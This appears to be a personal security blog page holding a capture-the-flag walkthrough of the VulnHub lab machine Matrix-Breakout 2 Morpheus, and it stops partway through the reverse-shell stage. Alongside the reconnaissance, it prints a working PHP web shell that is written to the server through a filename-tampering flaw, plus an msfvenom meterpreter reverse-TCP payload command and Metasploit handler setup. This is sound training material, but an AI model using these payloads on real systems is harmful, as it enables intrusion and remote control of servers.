@@ -1,0 +1,860 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head>
+    
+<script defer language="javascript" type="text/javascript" src="/js/light_dark.js"></script>
+<script defer language="javascript" type="text/javascript" src="/js/tabs.js"></script>
+
+
+<script defer language="javascript" type="text/javascript" src="/js/katex.min.js"></script>
+<script defer language="javascript" type="text/javascript" src="/js/auto-render.min.js"></script>
+
+
+
+
+
+<script defer language="javascript" type="text/javascript" src="/js/katex.js"></script>
+<script defer language="javascript" type="text/javascript" src="/js/toc.js"></script>
+
+
+
+
+
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    
+    
+
+
+
+
+
+  
+ 
+
+ 
+
+
+  
+  
+  
+ 
+
+
+
+  
+  
+    
+  
+  
+
+
+
+
+<title itemprop="name">Matrix Breakout 2 - </title>
+<meta property="og:title" content=Matrix&#32;Breakout&#32;2&#32;-&#32; />
+<meta name="twitter:title" content=Matrix&#32;Breakout&#32;2&#32;-&#32; />
+<meta itemprop="name" content=Matrix&#32;Breakout&#32;2&#32;-&#32; />
+<meta name="application-name" content=Matrix&#32;Breakout&#32;2&#32;-&#32; />
+<meta property="og:site_name" content="" />
+
+
+<meta name="description" content="" />
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+
+<base href="/featured/matrix2/" />
+<link rel="canonical" href="/featured/matrix2/" itemprop="url" />
+<meta name="url" content="/featured/matrix2/" />
+<meta name="twitter:url" content="/featured/matrix2/" />
+<meta property="og:url" content="/featured/matrix2/" />
+
+
+
+
+
+<meta property="og:updated_time" content=31003-31-10T321:07:23-0500 />
+
+
+<link rel="sitemap" type="application/xml" title="Sitemap" href='/sitemap.xml' />
+
+<meta name="robots" content="index,follow" />
+<meta name="googlebot" content="index,follow" />
+
+
+<meta name="twitter:site" content="" />
+<meta name="twitter:creator" content="" />
+<meta property="fb:admins" content="" />
+
+
+<meta name="apple-mobile-web-app-title" content="" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+
+
+
+
+
+
+<meta property="og:type" content="website" />
+<meta name="author" content="" />
+<script defer type="application/ld+json">
+  {
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "MATRIX-BREAKOUT 2",
+        "author": {
+            "@type": "Person",
+            "name": ""
+        },
+        "datePublished": "2023-03-31",
+        "description": "",
+        "wordCount":  2375 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2023-03-31",
+        "image": {
+            "@type": "imageObject",
+            "url": ""
+        },
+        "publisher": {
+            "@type": "Organization",
+            "name": "",
+            "logo": {
+            "@type": "imageObject",
+            "url": ""
+            }
+        }
+    }
+  }
+</script>
+
+
+
+<meta name="generator" content="Hugo 0.111.3">
+
+
+    
+    <link type="text/css" rel="stylesheet" href="/css/poole.css">
+<link type="text/css" rel="stylesheet" href="/css/syntax.css">
+<link type="text/css" rel="stylesheet" href="/css/hyde.css">
+<link type="text/css" rel="stylesheet" href="/css/poison.css">
+<link type="text/css" rel="stylesheet" href="/css/fonts.css">
+<link type="text/css" rel="stylesheet" href="/css/katex.min.css">
+<link type="text/css" rel="stylesheet" href="/css/tabs.css">
+
+
+<link type="text/css" rel="stylesheet" href="/css/custom.css">
+
+
+    
+    <style>
+    body {
+        --sidebar-bg-color: #202020;
+        --sidebar-img-border-color: #515151;
+        --sidebar-p-color: #909090;
+        --sidebar-h1-color: #FFF;
+        --sidebar-a-color: #FFF;
+        --sidebar-socials-color: #FFF;
+        --text-color: #222;
+        --bkg-color: #FAF9F6;
+        --post-title-color: #303030;
+        --list-color: #5a5a5a;
+        --link-color: #268bd2;
+        --date-color: #515151;
+        --table-border-color: #E5E5E5;
+        --table-stripe-color: #F9F9F9;
+        --code-color: #bf616a;
+        --code-background-color: #E5E5E5;
+        --moon-sun-color: #FFF;
+        --moon-sun-background-color: #515151;
+    }
+    body.dark-theme {
+        --text-color: #eee;
+        --bkg-color: #121212;
+        --post-title-color: #DBE2E9;
+        --list-color: #9d9d9d;
+        --link-color: #268bd2;
+        --date-color: #9a9a9a;
+        --table-border-color: #515151;
+        --table-stripe-color: #202020;
+        --code-color: #ff7f7f;
+        --code-background-color: #393D47;
+    }
+    body {
+        background-color: var(--bkg-color);
+    }
+</style>
+
+</head>
+
+    <body class="">
+        <div class="wrapper">
+            <aside class="sidebar">
+    <div class="container sidebar-sticky">
+        <div class="light-dark" align="right">
+    <button class="btn-light-dark">
+        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+        </svg>
+        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
+        </svg>
+    </button>
+</div>
+
+        <div class="sidebar-about">
+    <h1 class="brand">
+        
+            <a href="/">
+                <img src="/images/profilepix.jpg" alt="brand image">
+            </a>
+        
+        
+            <a href="/">
+                <h1>Ron Bulaon</h1>
+            </a>
+        
+    </h1>
+    <p class="lead">
+    Build - Secure - Innovate
+    </p>
+</div>
+
+        <nav>
+    <ul class="sidebar-nav">
+
+        
+        
+        
+        
+            
+                
+                    <li class="heading">
+                        <a href="/about/">About Me</a>
+                    </li>
+                    
+                
+            
+                
+            
+                
+            
+            
+                
+            
+                
+            
+        
+        
+            
+                
+            
+                
+            
+                
+                    <li class="heading">
+                        <a href="/posts/">Read Posts</a>
+                    </li>
+                    
+                
+            
+            
+                
+            
+                
+            
+        
+        
+            
+                
+            
+                
+                    <li class="heading">
+                        <a href="/featured/">Featured Post</a>
+                    </li>
+                    
+                        <li class="sub-heading">
+                            
+                        </li>
+                        
+                            <li class="bullet">
+                                <a href="/featured/matrix2/">MATRIX-BREAKOUT 2</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="/featured/bof/">Buffer Overflow</a>
+                            </li>
+                        
+                    
+                
+            
+                
+            
+            
+                
+            
+                
+            
+        
+
+    </ul>
+</nav>
+
+        <center>
+
+
+    <a target="_blank" class="social" href="https://github.com/RonBulaon">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
+            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
+        </svg>
+    </a>
+
+
+
+    <a target="_blank" class="social" href="https://www.linkedin.com/in/ronbulaon/">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
+            <path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9V416z"/>
+        </svg>
+    </a>
+
+
+
+
+
+
+    <a target="_blank" class="social" href="https://www.youtube.com/c/RonBulaon">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24">
+            <path fill="currentColor" d="M12.006 19.012h-.02c-.062 0-6.265-.012-7.83-.437a2.5 2.5 0 0 1-1.764-1.765A26.494 26.494 0 0 1 1.986 12a26.646 26.646 0 0 1 .417-4.817A2.564 2.564 0 0 1 4.169 5.4c1.522-.4 7.554-.4 7.81-.4H12c.063 0 6.282.012 7.831.437c.859.233 1.53.904 1.762 1.763c.29 1.594.427 3.211.407 4.831a26.568 26.568 0 0 1-.418 4.811a2.51 2.51 0 0 1-1.767 1.763c-1.52.403-7.553.407-7.809.407Zm-2-10.007l-.005 6l5.212-3l-5.207-3Z"/>
+        </svg>
+    </a>
+
+
+
+
+
+</center>
+        <p class="footnote">
+powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
+    <br>
+    &copy; 2023 . All rights reserved.
+</p>
+
+  </div>
+</aside>
+
+            <main class="content container">
+                <div class="post">
+  <div class="info">
+    <h1 class="post-title">
+        <a href="/featured/matrix2/">MATRIX-BREAKOUT 2</a>
+    </h1>
+    <time datetime="2023-03-31T10:21:07-0500" class="post-date">
+        March 31, 2023
+    </time>
+    
+    <ul class="tags">
+        
+        <li class="tag-security">
+            <a href="/tags/security">security</a>
+        </li>
+        
+        <li class="tag-hacking">
+            <a href="/tags/hacking">hacking</a>
+        </li>
+        
+        <li class="tag-burpsuite">
+            <a href="/tags/burpsuite">burpsuite</a>
+        </li>
+        
+        <li class="tag-pentesting">
+            <a href="/tags/pentesting">pentesting</a>
+        </li>
+        
+        <li class="tag-kali">
+            <a href="/tags/kali">kali</a>
+        </li>
+        
+        <li class="tag-CTF">
+            <a href="/tags/ctf">CTF</a>
+        </li>
+        
+        <li class="tag-vulnhub">
+            <a href="/tags/vulnhub">vulnhub</a>
+        </li>
+        
+    </ul>
+    
+    
+    
+    
+    
+    
+</div>
+
+  <h1 id="overview">Overview</h1>
+<p>Welcome to this blog post where we&rsquo;ll be doing a <strong>Capture the Flag</strong> (CTF) problem-solving challenge. CTF is a popular activity among IT security practitioners, especially with penetration testing professionals and enthusiasts.</p>
+<p>Today, we&rsquo;ll be solving <strong>MATRIX-BREAKOUT: 2 MORPHEUS</strong>, the second installment in the Matrix-Breakout series, with the subtitle &ldquo;Morpheus:1&rdquo;. Inspired by the iconic first Matrix movie, this challenge was contributed on <a href="https://www.vulnhub.com//">VulnHub</a> in late 2022 and rated as Medium/Hard.You can download it <a href="https://www.vulnhub.com/entry/matrix-breakout-2-morpheus,757/">here</a>.</p>
+<p>The objective of this challenge is to gain root access. Although others have attempted it before, <em><strong>I have not consulted any walkthroughs</strong></em> to ensure the authenticity of my approach. Let&rsquo;s get started!</p>
+<br/>
+<!-- TOC ignore:true --> 
+<h2>Table of Contents</h2> 
+<!-- TOC -->
+<ul>
+<li><a href="#overview">Overview</a></li>
+<li><a href="#planning-and-reconnaisance">Planning and Reconnaisance</a>
+<ul>
+<li><a href="#setup">Setup</a></li>
+<li><a href="#nmap">Nmap</a></li>
+<li><a href="#dirbuster">Dirbuster</a></li>
+</ul>
+</li>
+<li><a href="#testing-vulnerabilities">Testing Vulnerabilities</a></li>
+<li><a href="#gaining-access">Gaining Access</a></li>
+<li><a href="#privilege-escalation">Privilege Escalation</a></li>
+<li><a href="#conclusion">Conclusion</a>
+<ul>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#lessons-learned">Lessons learned</a></li>
+</ul>
+</li>
+</ul>
+<!-- /TOC -->
+<br/>
+<h1 id="planning-and-reconnaisance">Planning and Reconnaisance</h1>
+<h2 id="setup">Setup</h2>
+<ul>
+<li>The victim machine (MATRIX-BREAKOUT: 2 MORPHEUS) has been booted up and running on the same network as my attacker machine (<strong>Kali Linux</strong>). Both are running in Virtualbox.</li>
+</ul>
+<h2 id="nmap">Nmap</h2>
+<ul>
+<li>
+<p>We&rsquo;ll leverage the powerful network exploration tool, <code>Nmap</code>, to determine the IP address of the victim machine and scan for any open network ports. Additionally, we can use Nmap to identify any services running on those ports.</p>
+<h3 id="network-sweep">Network Sweep</h3>
+<ul>
+<li>
+<p>To ensure that our network sweep results are accurate, we need to check the IP address of the attacker machine and isolate it from the scan. This helps prevent any potential false positives or erroneous findings.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ifconfig eth1
+</span></span></code></pre></div>  <img src="/images/m2_ifconfig.png" alt="screenshot" width="100%"/>
+</li>
+<li>
+<p>To initiate the network sweep, execute the following command.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo nmap -sn 192.168.56.101-254
+</span></span></code></pre></div>  <img src="/images/m2_nmapsweep.png" alt="screenshot" width="100%"/>
+</li>
+<li>
+<p>It&rsquo;s important to note that the victim&rsquo;s IP address is <code>192.168.56.108</code>, while the attacker&rsquo;s IP address is <code>192.168.56.107</code>. Keep this in mind as we proceed with this activity.</p>
+</li>
+</ul>
+<h3 id="port-scanning">Port Scanning</h3>
+<ul>
+<li>Let&rsquo;s move on to port scanning.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo nmap -sC -sV -O 192.168.56.108
+</span></span></code></pre></div><ul>
+<li>
+<p><code>-sC</code> : Executes default scripts to detect potential vulnerabilities.</p>
+</li>
+<li>
+<p><code>-sV</code> : Enables version detection to determine which services are running on open ports.</p>
+</li>
+<li>
+<p><code>-O</code> : Attempts to identify the operating system (OS) running on the target machine.</p>
+  <img src="/images/m2_nmap_scan.png" alt="screenshot" width="100%"/>
+</li>
+<li>
+<p>Take note of the open ports and services:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.4p1 Debian <span style="color:#ae81ff">5</span> <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.51 <span style="color:#f92672">((</span>Debian<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>81/tcp open  http    nginx 1.18.0
+</span></span></code></pre></div></li>
+<li>
+<p>Take note of the OS information: Note that in this particular case, since the machine was downloaded from VulnHub, we may already have some information regarding the operating system. However, it&rsquo;s important to keep in mind that in real-world engagements, we may not have access to this information and should identify the operating system accurately.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>MAC Address: 08:00:27:70:2B:8E <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Device type: general purpose
+</span></span><span style="display:flex;"><span>Running: Linux 4.X|5.X
+</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+</span></span><span style="display:flex;"><span>OS details: Linux 4.15 - 5.6
+</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">1</span> hop
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div></li>
+</ul>
+</li>
+</ul>
+<h3 id="verify-port-scanning-results">Verify Port Scanning Results</h3>
+<p>Now that we have completed the port scanning, it&rsquo;s time to verify the results. This involves analyzing the information provided by the nmap tool, such as the open ports and detected services, to gain a better understanding of the target machine&rsquo;s network architecture. By carefully examining this information, we can identify potential vulnerabilities and plan our next steps accordingly.</p>
+<ul>
+<li>
+<p><strong>Checking port 22</strong>: Port 22 is a well-known port that is commonly associated with the Secure Shell (SSH) protocol. To confirm whether the SSH service is running on port 22, we can attempt to establish a connection using an SSH application. Upon testing, we have confirmed that the service is indeed running on this port.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ssh 192.168.56.108 
+</span></span></code></pre></div>  <img src="/images/m2_ssh.png" alt="screenshot" width="100%"/>  
+</li>
+<li>
+<p><strong>Checking port 80</strong>: Port 80 is commonly used for the Hypertext Transfer Protocol (HTTP) or web servers. To confirm that the HTTP service is running on the victim machine, we can simply type the machine&rsquo;s IP address into a web browser and see if a webpage is displayed.
+<img src="/images/m2_port80.png" alt="screenshot" width="100%"/></p>
+</li>
+<li>
+<p><strong>Checking port 81</strong>: It appears that port 81 is currently being utilized by Nginx, which is a popular open-source web server software. Additionally, the server has been configured with password protection, which may indicate that sensitive information or resources are being stored behind this port.
+<img src="/images/m2_port81.png" alt="screenshot" width="100%"/>
+<img src="/images/m2_port81_401.png" alt="screenshot" width="100%"/></p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="dirbuster">Dirbuster</h2>
+<ul>
+<li>
+<p>DirBuster is a web app security tool that identifies hidden directories and files through brute force attacks. By leveraging a brute force approach, DirBuster systematically attempts to access hidden directories and files that may not be easily discoverable through traditional browsing methods.</p>
+<h3 id="settings">Settings</h3>
+<ul>
+<li>I used the following settings:
+<img src="/images/m2_drib_settings.png" alt="screenshot" width="100%"/></li>
+</ul>
+<h3 id="results">Results</h3>
+<ul>
+<li>
+<p>After successfully brute-forcing the web server, it was discovered that there are three additional pages of interest.<br>
+<img src="/images/m2_drib_results.png" alt="screenshot" width="100%"/></p>
+</li>
+<li>
+<p>http://192.168.56.108/robot.txt
+<img src="/images/m2_robottxt.png" alt="screenshot" width="100%"/></p>
+</li>
+<li>
+<p>http://192.168.56.108/graffiti.txt
+<img src="/images/m2_graffititxt.png" alt="screenshot" width="100%"/></p>
+</li>
+<li>
+<p>http://192.168.56.108/graffiti.php
+<img src="/images/m2_graffitiphp.png" alt="screenshot" width="100%"/></p>
+</li>
+<li>
+<p>Further testing has revealed that the <code>graffiti.php</code> file is specifically programmed to write the value of the textbox to the <code>graffiti.txt</code> file and subsequently display it on its own page.
+<img src="/images/m2_graffiti_function.png" alt="screenshot" width="100%"/></p>
+</li>
+<li>
+<p>Upon inspecting the source code, it was discovered that the hidden HTML form includes a filename attribute with the value <code>graffiti.txt</code>. Based on this information, it is suspected that this is the same file that was tested earlier.
+<img src="/images/m2_graffiti_sourcecode.png" alt="screenshot" width="100%"/></p>
+</li>
+</ul>
+</li>
+</ul>
+<p><em><strong>Note</strong></em> : Given the current circumstances, it would be wise to only attempt to establish an SSH connection if necessary, as there are fewer vulnerabilities associated with SSH. Additionally, since port 81 is password protected, it may be best to hold off on conducting a scan until a password has been obtained or a vulnerability is doscovered.</p>
+<br/>
+<h1 id="testing-vulnerabilities">Testing Vulnerabilities</h1>
+<ul>
+<li>
+<p>Now, we&rsquo;ll proceed with testing our earlier hunch regarding the source code. To accomplish this, BurpSuite was launched and set as a proxy to intercept the browser request.</p>
+<h2 id="burpsuite">Burpsuite</h2>
+<ul>
+<li>Using the browser, we entered <code>&lt;?php phpinfo(); ?&gt;</code> and clicked the <code>Post</code> button.
+<img src="/images/m2_burpsuite_browser1.png" alt="screenshot" width="100%"/></li>
+<li>As anticipated, the request was successfully <strong>intercepted</strong>. To proceed with modifying the filename value, we sent it to <strong>Repeater</strong>.
+<img src="/images/m2_burpsuiteproxy1.png" alt="screenshot" width="100%"/></li>
+<li>After changing the filename value from graffiti.txt to info.php in Repeater, we clicked the Send button and received a successful HTTP code 200 response. This indicates that we are able to write a new file onto the server.
+<img src="/images/m2_burpsuite_repeater1.png" alt="screenshot" width="100%"/></li>
+<li>To further validate our changes, we loaded the URL <code>http://192.168.56.108/info.php</code> and were able to successfully load the page, which displayed version information for PHP.
+<img src="/images/m2_browser_infophp.png" alt="screenshot" width="100%"/></li>
+</ul>
+</li>
+</ul>
+<p><em><strong>Note</strong></em> : Now that we&rsquo;ve confirmed the server&rsquo;s vulnerability, the next step is to exploit it to gain shell access and further establish our foothold.</p>
+<br/>
+<h1 id="gaining-access">Gaining Access</h1>
+<ul>
+<li>
+<p>In a CTF, the objective of gaining shell access is to gain full control over the target machine&rsquo;s operating system. Once shell access has been obtained, the attacker can further explore the system, escalate privileges, and potentially exfiltrate sensitive information.</p>
+<h2 id="web-shell">Web Shell</h2>
+<ul>
+<li>Now we will be leveraging a PHP webshell, which can be used to remotely execute commands and gain control of the server.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>html<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span>body<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;</span>form method<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;GET&#34;</span> name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;?php echo basename($_SERVER[&#39;PHP_SELF&#39;]); ?&gt;&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;</span>input type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;TEXT&#34;</span> name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cmd&#34;</span> autofocus id<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cmd&#34;</span> size<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;80&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;</span>input type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;SUBMIT&#34;</span> value<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Execute&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/</span>form<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span>pre<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">?</span>php
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(isset(<span style="color:#960050;background-color:#1e0010">$</span>_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>]))
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>                system(<span style="color:#960050;background-color:#1e0010">$</span>_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>]);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        <span style="color:#960050;background-color:#1e0010">?</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/</span>pre<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/</span>body<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span>html<span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div></li>
+<li>Let&rsquo;s copy-paste this code to <code>http://192.168.56.108/graffiti.php</code>
+<img src="/images/m2_burpsuite_browser2.png" alt="screenshot" width="100%"/></li>
+<li>Using the still-open <strong>BurpSuite</strong>, we intercepted the request and sent it to Repeater, where we changed the file name to <code>shell.php</code>, clicked <code>Send</code>, and observed a successful <strong>HTTP code 200</strong> response.
+<img src="/images/m2_burpsuite_repeater2.png" alt="screenshot" width="100%"/></li>
+<li>To test the shell, we loaded the following address in the browser: <code>http://192.168.56.108/graffiti.php</code>, and entered the <code>ifconfig</code> command to verify that the shell was functioning properly.
+<img src="/images/m2_webshell1.png" alt="screenshot" width="100%"/></li>
+</ul>
+<h2 id="msfvenom">MSFVenom</h2>
+<ul>
+<li>
+<p>Creating a reverse shell using msfvenom is a powerful technique in penetration testing, allowing the attacker to gain remote access to a target machine through a single command. This custom payload can potentially evade detection by security measures, making it a valuable tool for testing the security of a system.
+<img src="/images/m2_reverseshell1.png" alt="screenshot" width="100%"/></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.56.107 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -f elf &gt; shell.elf
+</span></span></code></pre></div><ul>
+<li><code>-p linux/x64/meterpreter_reverse_tcp</code>: Specifies the type of payload to generate, in this case a 64-bit Linux Meterpreter reverse TCP shell.</li>
+<li><code>LHOST=192.168.56.107</code>: Specifies the IP address of the local host (attacker machine) to connect back to.</li>
+<li><code>LPORT=4444</code>: Specifies the port number on the local host to connect back to.</li>
+<li><code>-f elf</code>: Specifies the output format of the generated payload, in this case as a Linux ELF binary.</li>
+<li><code>&gt; shell.elf</code>: Redirects the output of the generated payload to a file named &ldquo;shell.elf&rdquo; for later use.</li>
+</ul>
+<p><code>shell.elf</code> is the reverse shell program that we&rsquo;ll be using later at the victim machine.</p>
+</li>
+</ul>
+<h2 id="metasploit">Metasploit</h2>
+<ul>
+<li>
+<p>In order to receive the reverse shell, we will be utilizing Metasploit&rsquo;s multi handler, which is a powerful and reliable tool for penetration testers.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ msfconsole
+</span></span><span style="display:flex;"><span>msf6 &gt; use exploit/multi/handler 
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set LHOST 192.168.56.107
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set LPORT <span style="color:#ae81ff">4444</span>
